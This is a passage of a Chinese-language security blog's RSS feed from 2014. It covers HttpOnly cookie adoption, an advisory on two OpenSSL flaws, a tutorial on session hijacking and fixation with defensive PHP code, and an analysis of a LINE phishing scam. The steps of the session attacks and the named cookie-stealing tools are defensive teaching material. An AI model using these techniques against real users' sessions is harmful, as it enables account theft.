&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-example-1.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-example-1.png&quot; alt=&quot;T客邦&quot; title=&quot;T客邦&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;愛料理 (icook.tw)，有設定 HttpOnly&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-example-2.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-example-2.png&quot; alt=&quot;愛料理&quot; title=&quot;愛料理&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Mobile01 (www.mobile01.com)，未設定 HttpOnly&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-example-3.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-example-3.png&quot; alt=&quot;Mobile01&quot; title=&quot;Mobile01&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Giga Circle (tw.gigacircle.com)，未設定 HttpOnly&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140611/httponly-example-4.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140611/httponly-example-4.png&quot; alt=&quot;Giga Circle&quot; title=&quot;Giga Circle&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;結論&quot;&gt;結論&lt;/h3&gt;

&lt;p&gt;HttpOnly 是存在已久的技術，但在我們&lt;a href=&quot;https://devco.re/blog/2014/03/10/security-issues-of-http-headers-1/&quot;&gt;系列文第一篇&lt;/a&gt;的統計當中，採用的比例仍然偏低。如同之前我們提及的 &lt;a href=&quot;http://devco.re/blog/2014/05/05/zone-transfer-CVE-1999-0532-an-old-dns-security-issue/&quot;&gt;Zone Transer&lt;/a&gt; 問題，即使一項資安技術或資安議題存在很久，也需要大家持續關注。&lt;/p&gt;

&lt;p&gt;但即使採用了 HttpOnly，也僅能防止惡意人士不正當存取 cookie，無法防禦其他的 XSS 攻擊方式，例如將使用者導向至釣魚網站騙取個資、導向至惡意網站植入後門、置換網頁外觀等等。同時未來仍有可能出現新的 XSS 攻擊手法，因此千萬別因設定了 HttpOnly 就掉以輕心，誤以為不會再被 XSS 手法侵害企業利益或用戶資料，仍然必須謹慎檢查每一個系統輸出輸入點，以避免未來因上述影響導致用戶或企業蒙受損失。&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/06/11/setcookie-httponly-security-issues-of-http-headers-3/</link>
                <guid>https://devco.re/blog/2014/06/11/setcookie-httponly-security-issues-of-http-headers-3</guid>
                <pubDate>Wed, 11 Jun 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>OpenSSL 再爆嚴重漏洞，部分重要網站仍在風險中！</title>
                <description>&lt;p&gt;(本篇最後更新時間：2014.6.9 15:40 pm)&lt;/p&gt;

&lt;p&gt;OpenSSL 團隊於 6/5 修補了&lt;a href=&quot;http://www.openssl.org/news/secadv_20140605.txt&quot;&gt;六項安全漏洞&lt;/a&gt;，&lt;a href=&quot;http://www.sans.org/about/&quot;&gt;SANS&lt;/a&gt; 在&lt;a href=&quot;https://isc.sans.edu/diary/Critical+OpenSSL+Patch+Available+Patch+Now/18211&quot;&gt;這篇文章&lt;/a&gt;中整理了這幾個漏洞的摘要，這裡截圖表格如下：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140609/openssl_0605_table.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140609/openssl_0605_table.png&quot; alt=&quot;OpenSSL 0605 安全更新比較表&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;其中 CVE-2014-0224、CVE-2014-0195 兩項被列為 Critical，我們分別來看看這兩個弱點到底造成了什麼危害。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;cve-2014-0224-ccs-injection-vulnerability&quot;&gt;CVE-2014-0224 (CCS Injection Vulnerability)&lt;/h3&gt;

&lt;h4 id=&quot;說明&quot;&gt;說明&lt;/h4&gt;

&lt;p&gt;加密通訊被視為預防&lt;a href=&quot;http://zh.wikipedia.org/wiki/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB&quot;&gt;中間人攻擊&lt;/a&gt;的解法之一，利用 SSL 協定防止竊聽、竄改傳輸資料是一種常見的方式。然而 OpenSSL 這次出現在 ChangeCipherSpec（更改密鑰規格）的設計瑕疵，讓攻擊者有辦法解密所有通訊內容，讓加密保護徹底失效。&lt;/p&gt;

&lt;p&gt;該弱點原理是 OpenSSL 伺服器端在實作 handshake 時並未檢查訊息的順序（嚴格來說是 ChangeCipherSpec 的順序），所以攻擊者可以提前送出 ChangeCipherSpec 訊息，使伺服器在還未初始完畢的狀態先去做 ChangeCipherSpec 的動作，最終造成加解密可解的狀況，是以此弱點稱之為 CCS Injection。更多的細節請參考原通報者 Masashi Kikuchi 的&lt;a href=&quot;http://ccsinjection.lepidum.co.jp/blog/2014-06-05/CCS-Injection-en/index.html&quot;&gt;部落格&lt;/a&gt;，佐以&lt;a href=&quot;https://www.imperialviolet.org/2014/06/05/earlyccs.html&quot;&gt;這篇&lt;/a&gt;附程式碼的解說，OpenSSL github 上關於 CVE-2014-0224 的 &lt;a href=&quot;https://github.com/openssl/openssl/commit/a91be10833e61bcdc9002de28489405101c52650&quot;&gt;fix&lt;/a&gt; 也可以幫助了解。&lt;/p&gt;

&lt;h4 id=&quot;誰應該注意&quot;&gt;誰應該注意&lt;/h4&gt;

&lt;p&gt;所有靠 OpenSSL 保護連線的應用服務都需要注意。又尤其是銀行、金流服務這些連線中存在金融資訊的服務，若不注意會造成信用卡卡號洩漏，網路銀行被盜用。經過實際檢測，&lt;strong&gt;目前仍有銀行單位和金流單位使用有問題的 OpenSSL 版本&lt;/strong&gt;。消費者需要特別注意，在使用前也可透過下面小工具來輔助檢查自己所使用的服務使否存在風險：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Tripwire 提供的&lt;a href=&quot;http://www.tripwire.com/state-of-security/incident-detection/detection-script-for-cve-2014-0224-openssl-cipher-change-spec-injection/&quot;&gt;小程式&lt;/a&gt; (python)&lt;/li&gt;
  &lt;li&gt;測試網站 &lt;a href=&quot;http://ccsbug.exposed/&quot;&gt;http://ccsbug.exposed/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;慶幸的是，此弱點只發生在用戶端及伺服器端皆使用有問題 OpenSSL 版本的狀況下。一般來說，桌面端的瀏覽器都不是使用 OpenSSL，所以一般使用者可以稍微安心。問題比較大的是 android 使用者，android 內建 OpenSSL，許多 app 呼叫它來進行加密傳輸，所以建議 android 用戶在 google 釋出更新前，不要使用手機連線到有問題的服務，或使用自帶 SSL 的 app，例如：firefox、最新版 Chrome (35.0.1916.141)…。&lt;/p&gt;

&lt;p&gt;另外，若使用者常用到一些加密連線服務，例如 VPN，請自行注意所使用軟體是否使用 OpenSSL，以免受到 CCS Injection 的影響。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140609/logo.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140609/logo.png&quot; alt=&quot;CCS Injection Vulnerability&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;最後說個題外話，原來現在發表漏洞還要為漏洞出張圖，在 Hacker News 原討論串的&lt;a href=&quot;https://news.ycombinator.com/item?id=7851357#up_7851735&quot;&gt;這篇回應&lt;/a&gt;，就有人說：『這個漏洞有 logo 嗎？如果沒有我就不打算認真看待它！』XD&lt;/p&gt;

&lt;h3 id=&quot;cve-2014-0195-dtls-arbitrary-code-execution&quot;&gt;CVE-2014-0195 (DTLS arbitrary code execution)&lt;/h3&gt;

&lt;h4 id=&quot;說明-1&quot;&gt;說明&lt;/h4&gt;

&lt;p&gt;OpenSSL 在處理 &lt;a href=&quot;http://en.wikipedia.org/wiki/Datagram_Transport_Layer_Security&quot;&gt;DTLS&lt;/a&gt; 訊息上，為了避免 IP fragmentation，所以做了一些處理機制，這個處理機制並沒有好好驗證 DLTS ClientHello 中的 fragment 長度（嚴格來說是在正確的位置做驗證），若攻擊者發送一個很長的 fragment，能造成緩衝區溢位攻擊。更多的細節請參考&lt;a href=&quot;http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/ZDI-14-173-CVE-2014-0195-OpenSSL-DTLS-Fragment-Out-of-Bounds/ba-p/6501002#.U5FqnvmSyD4&quot;&gt;這篇文章&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;比較有趣的是那段出問題的程式碼是一位有名德國工程師 Robin Seggelmann 寫的，有名的點在於上次非常嚴重的 &lt;a href=&quot;http://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;Heartbleed&lt;/a&gt; 事件也是他寫的 code XD&lt;/p&gt;

&lt;h4 id=&quot;誰應該注意-1&quot;&gt;誰應該注意&lt;/h4&gt;

&lt;p&gt;使用 OpenSSL 且有用到 DTLS 的服務提供者，通常是 VoIP、WebRTC、VPN 這類服務，這個風險有可能會造成伺服器被入侵。&lt;/p&gt;

&lt;h3 id=&quot;修補&quot;&gt;修補&lt;/h3&gt;

&lt;p&gt;除了上面所提及兩個嚴重風險，這次的更新也同時修復了幾個 DOS 的弱點，強烈建議伺服器端更新。&lt;br /&gt;
請確認 OpenSSL 已經更新到下面版本，並且有重新啟動讓其生效。&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;OpenSSL 0.9.8za&lt;/li&gt;
  &lt;li&gt;OpenSSL 1.0.0m&lt;/li&gt;
  &lt;li&gt;OpenSSL 1.0.1h&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;更新資訊依據所用的系統分別如下：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.ubuntu.com/usn/usn-2232-1/&quot;&gt;Ubuntu&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://lists.debian.org/debian-security-announce/2014/msg00129.html&quot;&gt;Debian&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.freebsd.org/security/advisories/FreeBSD-SA-14:14.openssl.asc&quot;&gt;FreeBSD&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://lists.centos.org/pipermail/centos-announce/2014-June/020344.html&quot;&gt;CentOS&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://rhn.redhat.com/errata/RHSA-2014-0624.html&quot;&gt;Red Hat 5&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://rhn.redhat.com/errata/RHSA-2014-0625.html&quot;&gt;Red Hat 6&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://aws.amazon.com/jp/security/security-bulletins/openssl-security-advisory/&quot;&gt;Amazon Linux AMI&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;小結&quot;&gt;小結&lt;/h3&gt;

&lt;p&gt;這次 OpenSSL 做了數個安全性的更新，雖然不若&lt;a href=&quot;http://devco.re/blog/2014/04/11/openssl-heartbleed-how-to-hack-how-to-protect/&quot;&gt;之前 Heartbleed 那麼嚴重&lt;/a&gt;，但卻也讓使用者暴露在風險中。建議有使用 OpenSSL 都應該更新到最新版本，尤其是一些大型的銀行及金流服務，更應儘速更新。&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/06/09/openssl-CVE-2014-0224-ccs-injection/</link>
                <guid>https://devco.re/blog/2014/06/09/openssl-CVE-2014-0224-ccs-injection</guid>
                <pubDate>Mon, 09 Jun 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>HTTP Session 攻擊與防護</title>
                <description>&lt;h3 id=&quot;前言&quot;&gt;前言&lt;/h3&gt;

&lt;p&gt;大家還記得四月份的 &lt;a href=&quot;https://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;OpenSSL Heartbleed&lt;/a&gt; 事件嗎？當時除了網站本身以外，受害最嚴重的就屬 VPN Server 了。國內外不少駭客不眠不休利用 Heartbleed 漏洞竊取 VPN Server 的管理者 Session Cookie，運氣好的話就可以直接登入大企業的內網。&lt;/p&gt;

&lt;p&gt;但是，其實這樣的風險是可以避免的，今天我們以開發者的角度來談談 Session 的攻擊與防護。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;什麼是-session什麼是-cookie&quot;&gt;什麼是 Session？什麼是 Cookie？&lt;/h3&gt;

&lt;p&gt;在談 Session 之前，我們要先瞭解 Cookie。你知道網站是如何辨識我們的身份嗎？為什麼我們輸入完帳號密碼之後，網站就知道我們是誰呢？就是利用 Cookie。Cookie 是網站在瀏覽器中存放的資料，內容包括使用者在網站上的偏好設定、或者是登入的 Session ID。網站利用 Session ID 來辨認訪客的身份。&lt;/p&gt;

&lt;p&gt;Cookie 既然存放在 Client 端，那就有被竊取的風險。例如透過 &lt;a href=&quot;https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29&quot;&gt;Cross-Site Scripting（跨站腳本攻擊，又稱 XSS）&lt;/a&gt;，攻擊者可以輕易竊取受害者的 Cookie。如果 Cookie 被偷走了，你的身份就被竊取了。&lt;/p&gt;

&lt;p&gt;我們可以用一個譬喻來表示：你加入了一個秘密俱樂部，填寫完會員資料後，得到了一張會員卡。之後只要憑這張會員卡，就可以進入這個俱樂部。但是隔天，你的會員卡掉了。撿走你會員卡的人，就可以用你的會員卡進入這個秘密俱樂部，因為會員卡上沒有你的照片或是其他足以辨識身分的資訊。這就像是一個會員網站，我們申請了一個帳號（填寫會員資料加入俱樂部），輸入帳號密碼登入之後，得到一組 Cookie，其中有 Session ID 來辨識你的身分（透過會員卡來辨識身分）。今天如果 Cookie 被偷走了（會員卡被撿走了），別人就可以用你的帳號來登入網站（別人用你的會員卡進入俱樂部）。&lt;/p&gt;

&lt;p&gt;Session 攻擊手法有三種：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;猜測 Session ID (Session Prediction)&lt;/li&gt;
  &lt;li&gt;竊取 Session ID (Session Hijacking)&lt;/li&gt;
  &lt;li&gt;固定 Session ID (Session Fixation)&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;我們以下一一介紹。&lt;/p&gt;

&lt;h4 id=&quot;session-prediction-猜測-session-id&quot;&gt;Session Prediction (猜測 Session ID)&lt;/h4&gt;

&lt;p&gt;Session ID 如同我們前面所說的，就如同是會員卡的編號。只要知道 Session ID，就可以成為這個使用者。如果 Session ID 的長度、複雜度、雜亂度不夠，就能夠被攻擊者猜測。攻擊者只要寫程式不斷暴力計算 Session ID，就有機會得到有效的 Session ID 而竊取使用者帳號。&lt;/p&gt;

&lt;p&gt;分析 Session ID 的工具可以用以下幾種&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Category:OWASP_WebScarab_Project&quot;&gt;OWASP WebScarab&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://lcamtuf.coredump.cx/soft/stompy.tgz&quot;&gt;Stompy&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://portswigger.net/burp/&quot;&gt;Burp Suite&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;觀察 Session ID 的亂數分布，可以了解是否能夠推出規律、猜測有效的 Session ID。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-03-session-id-analysis.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-03-session-id-analysis.png&quot; alt=&quot;分析 Session ID&quot; title=&quot;分析 Session ID&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Ref: &lt;a href=&quot;http://programming4.us/security/3950.aspx&quot;&gt;http://programming4.us/security/3950.aspx&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;防護措施&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;使用 Session ID 分析程式進行分析，評估是否無法被預測。如果沒有 100% 的把握自己撰寫的 Session ID 產生機制是安全的，不妨使用內建的 Session ID 產生 function，通常都有一定程度的安全。&lt;/p&gt;

&lt;h4 id=&quot;session-hijacking-竊取-session-id&quot;&gt;Session Hijacking (竊取 Session ID)&lt;/h4&gt;

&lt;p&gt;竊取 Session ID 是最常見的攻擊手法。攻擊者可以利用多種方式竊取 Cookie 獲取 Session ID：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;跨站腳本攻擊 (&lt;a href=&quot;https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29&quot;&gt;Cross-Site Scripting (XSS)&lt;/a&gt;)：利用 XSS 漏洞竊取使用者 Cookie&lt;/li&gt;
  &lt;li&gt;網路竊聽：使用 ARP Spoofing 等手法竊聽網路封包獲取 Cookie&lt;/li&gt;
  &lt;li&gt;透過 Referer 取得：若網站允許 Session ID 使用 URL 傳遞，便可能從 Referer 取得 Session ID&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;竊取利用的方式如下圖：&lt;/p&gt;

&lt;p&gt;受害者已經登入網站伺服器，並且取得 Session ID，在連線過程中攻擊者用竊聽的方式獲取受害者 Session ID。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-01-session-id-sniffing.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-01-session-id-sniffing.png&quot; alt=&quot;竊取 Session ID&quot; title=&quot;竊取 Session ID&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;攻擊者直接使用竊取到的 Session ID 送至伺服器，偽造受害者身分。若伺服器沒有檢查 Session ID 的使用者身分，則可以讓攻擊者得逞。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-02-session-id-spoofing.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-02-session-id-spoofing.png&quot; alt=&quot;偽造 Session ID&quot; title=&quot;偽造 Session ID&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;防護措施&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;禁止將 Session ID 使用 URL (GET) 方式來傳遞&lt;/li&gt;
  &lt;li&gt;設定加強安全性的 Cookie 屬性：HttpOnly (無法被 JavaScript 存取)&lt;/li&gt;
  &lt;li&gt;設定加強安全性的 Cookie 屬性：Secure (只在 HTTPS 傳遞，若網站無 HTTPS 請勿設定)&lt;/li&gt;
  &lt;li&gt;在需要權限的頁面請使用者重新輸入密碼&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;session-fixation-固定-session-id&quot;&gt;Session Fixation (固定 Session ID)&lt;/h4&gt;

&lt;p&gt;攻擊者誘使受害者使用特定的 Session ID 登入網站，而攻擊者就能取得受害者的身分。&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;攻擊者從網站取得有效 Session ID&lt;/li&gt;
  &lt;li&gt;使用社交工程等手法誘使受害者點選連結，使用該 Session ID 登入網站&lt;/li&gt;
  &lt;li&gt;受害者輸入帳號密碼成功登入網站&lt;/li&gt;
  &lt;li&gt;攻擊者使用該 Session ID，操作受害者的帳號&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-04-session-id-fixation.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140603/2014-05-16-http-session-protection-04-session-id-fixation.png&quot; alt=&quot;Session Fixation&quot; title=&quot;Session Fixation&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;防護措施&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;在使用者登入成功後，立即更換 Session ID，防止攻擊者操控 Session ID 給予受害者。&lt;/li&gt;
  &lt;li&gt;禁止將 Session ID 使用 URL (GET) 方式來傳遞&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;session-防護&quot;&gt;Session 防護&lt;/h3&gt;

&lt;p&gt;那要怎麼防範攻擊呢？當然會有人說，會員卡不要掉不就沒事了嗎？當然我們沒辦法確保用戶不會因為各種方式導致 Cookie 遭竊（XSS、惡意程式等），因此最後一道防線就是網站的 Session 保護。一張會員卡上如果沒有任何可識別的個人資料，當然任何人撿去了都可以用。如果上面有照片跟簽名呢？偷走會員卡的人在進入俱樂部的時候，在門口就會因為照片跟本人不符而被擋下來。Session 保護也是一樣，怎麼讓我們的 Session 保護機制也能辨識身分呢？答案是利用每個使用者特有的識別資訊。&lt;/p&gt;

&lt;p&gt;每個使用者在登入網站的時候，我們可以用每個人特有的識別資訊來確認身分：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;來源 IP 位址&lt;/li&gt;
  &lt;li&gt;瀏覽器 User-Agent&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;如果在同一個 Session 中，使用者的 IP 或者 User-Agent 改變了，最安全的作法就是把這個 Session 清除，請使用者重新登入。雖然使用者可能因為 IP 更換、Proxy 等因素導致被強制登出，但為了安全性，便利性必須要與之取捨。以 PHP 為例，我們可以這樣撰寫：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;x&quot;&gt;if($_SERVER[&amp;#39;REMOTE_ADDR&amp;#39;] !== $_SESSION[&amp;#39;LAST_REMOTE_ADDR&amp;#39;] || $_SERVER[&amp;#39;HTTP_USER_AGENT&amp;#39;] !== $_SESSION[&amp;#39;LAST_USER_AGENT&amp;#39;]) {&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;   session_destroy();&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;session_regenerate_id();&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;$_SESSION[&amp;#39;LAST_REMOTE_ADDR&amp;#39;] = $_SERVER[&amp;#39;REMOTE_ADDR&amp;#39;];&lt;/span&gt;
&lt;span class=&quot;x&quot;&gt;$_SESSION[&amp;#39;LAST_USER_AGENT&amp;#39;] = $_SERVER[&amp;#39;HTTP_USER_AGENT&amp;#39;];&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;除了檢查個人識別資訊來確認是否盜用之外，也可以增加前述的 Session ID 的防護方式：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Cookie 設定 Secure Flag (HTTPS)&lt;/li&gt;
  &lt;li&gt;Cookie 設定 HTTP Only Flag&lt;/li&gt;
  &lt;li&gt;成功登入後立即變更 Session ID&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Session 的清除機制也非常重要。當伺服器偵測到可疑的使用者 Session 行為時，例如攻擊者惡意嘗試偽造 Session ID、使用者 Session 可能遭竊、或者逾時等情況，都應該立刻清除該 Session ID 以免被攻擊者利用。&lt;/p&gt;

&lt;p&gt;Session 清除機制時機：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;偵測到惡意嘗試 Session ID&lt;/li&gt;
  &lt;li&gt;識別資訊無效時&lt;/li&gt;
  &lt;li&gt;逾時&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;管理者有避免使用者帳號遭竊的責任&quot;&gt;管理者有避免使用者帳號遭竊的責任&lt;/h3&gt;

&lt;p&gt;使用者帳號遭竊一直以來都是顯著的問題，但卻鮮少有網站針對 Session 的機制進行保護。攻擊者可以輕鬆使用 &lt;a href=&quot;http://codebutler.github.io/firesheep/&quot;&gt;firesheep&lt;/a&gt; 之類的工具竊取帳號。國外已經有不少網站偵測到 Session 可能遭竊時將帳號強制登出，但國內目前還鮮少網站實作此防禦，設備商的 Web 管理介面更少針對 Session 進行保護。如果 VPN Server 等設備有偵測 Session ID 的偽造，在 &lt;a href=&quot;http://devco.re/blog/2014/04/11/openssl-heartbleed-how-to-hack-how-to-protect/&quot;&gt;OpenSSL Heartbleed&lt;/a&gt; 事件時就不會有那麼慘重的損失了。&lt;/p&gt;

&lt;p&gt;立刻把自己的網站加上 Session 保護機制吧！&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2014/06/03/http-session-protection/</link>
                <guid>https://devco.re/blog/2014/06/03/http-session-protection</guid>
                <pubDate>Tue, 03 Jun 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>LINE 免費貼圖釣魚訊息分析</title>
                <description>&lt;p&gt;晚上突然接到社群朋友傳 LINE 的訊息過來，定睛一看並不單純。這網址看起來就是釣魚網站啊？怎麼會這樣呢？難道是朋友在測試我們的警覺心夠不夠嗎？讓我們看下去這個釣魚網頁怎麼玩。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140512/LINE_Phishing_01.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140512/LINE_Phishing_01.png&quot; alt=&quot;LINE 傳送贈送貼圖訊息釣魚&quot; title=&quot;LINE 傳送贈送貼圖訊息釣魚&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;此 LINE 釣魚訊息說只要幫忙轉發 15 次訊息，就會贈送貼圖。先不論 LINE 有沒有這樣的機制，我們先直接點選連結看看葫蘆裡賣什麼藥。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140512/LINE_Phishing_02.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140512/LINE_Phishing_02.png&quot; alt=&quot;LINE 釣魚假貼圖網頁&quot; title=&quot;LINE 釣魚假貼圖網頁&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;瀏覽器打開之後，跳出了領取貼圖的「網頁」，而且還有詭異的紅字。各種跡象都跟一般領取貼圖的模式不同，太令人起疑了。點了圖就會跳到 Facebook 登入頁面。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140512/LINE_Phishing_03.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140512/LINE_Phishing_03.png&quot; alt=&quot;假 Facebook 登入頁面騙取帳號密碼&quot; title=&quot;假 Facebook 登入頁面騙取帳號密碼&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;明眼人看到這個 Facebook 登入頁面就會發現太假了，破綻多多。Logo、網址、網頁格式破板、簡體字，太多令人懷疑的地方了。在這邊我們只要隨便輸入帳號跟密碼，就能到下個畫面。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140512/LINE_Phishing_04.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140512/LINE_Phishing_04.png&quot; alt=&quot;假 Facebook 登入完成頁面&quot; title=&quot;假 Facebook 登入完成頁面&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;結果當然是不會給你貼圖啦！而且網址「cuowu」是「錯誤」的拼音，也暴露了網站作者的身分。直接用瀏覽器看傳遞的頁面叫做「tj.asp」，「tj」正好是「提交」，畫面上的錯誤訊息更是大剌剌的直接秀出簡體字。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140512/LINE_Phishing_05.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140512/LINE_Phishing_05.png&quot; alt=&quot;釣魚網站網頁訊息&quot; title=&quot;釣魚網站網頁訊息&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;事後友人直接說 LINE 帳號被盜用發訊息了，而且密碼可能過於簡單、也沒有設定換機密碼。因此在這邊呼籲大家做好 LINE 的安全設定：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;加強密碼長度、複雜度&lt;/li&gt;
  &lt;li&gt;設定「換機密碼」&lt;/li&gt;
  &lt;li&gt;若只在手機使用 LINE，可將「允許自其他裝置登入」關閉&lt;/li&gt;
  &lt;li&gt;如果有帳號被盜狀況，趕快聯絡 LINE &lt;a href=&quot;https://line.naver.jp/cs/&quot;&gt;https://line.naver.jp/cs/&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;大家在享受通訊軟體與朋友傳訊貼圖的同時，也必須要注意有心人士利用這些管道竊取你的帳號密碼喔！&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/05/12/line-phishing/</link>
                <guid>https://devco.re/blog/2014/05/12/line-phishing</guid>
                <pubDate>Mon, 12 May 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>搶搭核四與服貿熱潮的潛在詐騙網站</title>
                <description>&lt;h3 id=&quot;votetwam&quot;&gt;vote.tw.am&lt;/h3&gt;

&lt;p&gt;最近很多人都收到了一個看起來很像釣魚網站的核四投票站台簡訊，如下圖：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140507/1.vote.tw.am.jpg&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140507/1.vote.tw.am.jpg&quot; alt=&quot;核四投票站台簡訊&quot; title=&quot;核四投票站台簡訊&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;我們也收到了，但是剛吃飽飯實在很想睡覺，不太想理他，於是就忍不住趴下睡覺，竟然做了個夢…..&lt;/p&gt;

